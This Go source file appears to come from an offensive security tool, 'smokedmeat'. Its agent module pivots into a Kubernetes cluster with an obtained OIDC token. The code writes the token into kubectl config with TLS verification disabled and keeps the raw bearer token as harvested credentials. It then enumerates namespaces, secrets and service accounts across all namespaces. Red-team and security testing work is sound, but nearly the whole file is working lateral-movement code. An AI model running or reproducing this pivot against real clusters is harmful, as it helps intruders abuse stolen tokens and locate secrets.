// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package brisket

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"

	"github.com/boostsecurityio/smokedmeat/internal/models"
)

func (a *Agent) pivotKubernetes(token *OIDCToken, result *models.PivotResult) error {
	server := os.Getenv("KUBERNETES_SERVICE_HOST")
	port := os.Getenv("KUBERNETES_SERVICE_PORT")

	if server == "" {
		server = os.Getenv("K8S_SERVER")
	}
	if port == "" {
		port = "443"
	}

	if server == "" {
		return fmt.Errorf("kubernetes server not detected (set K8S_SERVER)")
	}

	clusterURL := fmt.Sprintf("https://%s:%s", server, port)

	cmd := exec.Command("kubectl", "config", "set-cluster", "oidc-cluster",
		"--server", clusterURL,
		"--insecure-skip-tls-verify=true",
	)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to set cluster: %w", err)
	}

	cmd = exec.Command("kubectl", "config", "set-credentials", "oidc-user",
		"--token", token.RawToken,
	)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to set credentials: %w", err)
	}

	cmd = exec.Command("kubectl", "config", "set-context", "oidc-context",
		"--cluster", "oidc-cluster",
		"--user", "oidc-user",
	)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to set context: %w", err)
	}

	cmd = exec.Command("kubectl", "config", "use-context", "oidc-context")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to use context: %w", err)
	}

	result.Credentials = map[string]string{
		"Server":  clusterURL,
		"Context": "oidc-context",
		"Method":  "bearer_token",
	}

	result.RawCredentials = map[string]string{
		"BEARER_TOKEN": token.RawToken,
		"SERVER":       clusterURL,
	}

	a.enumerateKubernetes(result)

	return nil
}

func (a *Agent) enumerateKubernetes(result *models.PivotResult) {
	cmd := exec.Command("kubectl", "get", "namespaces", "-o", "json")
	var stdout bytes.Buffer
	cmd.Stdout = &stdout

	if cmd.Run() == nil {
		var nsList struct {
			Items []struct {
				Metadata struct {
					Name string `json:"name"`
				} `json:"metadata"`
			} `json:"items"`
		}
		if json.Unmarshal(stdout.Bytes(), &nsList) == nil {
			for _, ns := range nsList.Items {
				result.Resources = append(result.Resources, models.CloudResource{
					Type: "namespace",
					Name: ns.Metadata.Name,
				})
			}
		}
	}

	cmd = exec.Command("kubectl", "get", "secrets", "--all-namespaces", "-o", "json")
	stdout.Reset()
	cmd.Stdout = &stdout

	if cmd.Run() == nil {
		var secretList struct {
			Items []struct {
				Metadata struct {
					Name      string `json:"name"`
					Namespace string `json:"namespace"`
				} `json:"metadata"`
				Type string `json:"type"`
			} `json:"items"`
		}
		if json.Unmarshal(stdout.Bytes(), &secretList) == nil {
			for _, s := range secretList.Items {
				result.Resources = append(result.Resources, models.CloudResource{
					Type: "secret",
					Name: s.Metadata.Name,
					Metadata: map[string]string{
						"namespace": s.Metadata.Namespace,
						"type":      s.Type,
					},
				})
			}
		}
	}

	cmd = exec.Command("kubectl", "get", "serviceaccounts", "--all-namespaces", "-o", "json")
	stdout.Reset()
	cmd.Stdout = &stdout

	if cmd.Run() == nil {
		var saList struct {
			Items []struct {
				Metadata struct {
					Name      string `json:"name"`
					Namespace string `json:"namespace"`
				} `json:"metadata"`
			} `json:"items"`
		}
		if json.Unmarshal(stdout.Bytes(), &saList) == nil {
			for _, sa := range saList.Items {
				result.Resources = append(result.Resources, models.CloudResource{
					Type: "service_account",
					Name: sa.Metadata.Name,
					Metadata: map[string]string{
						"namespace": sa.Metadata.Namespace,
					},
				})
			}
		}
	}
}
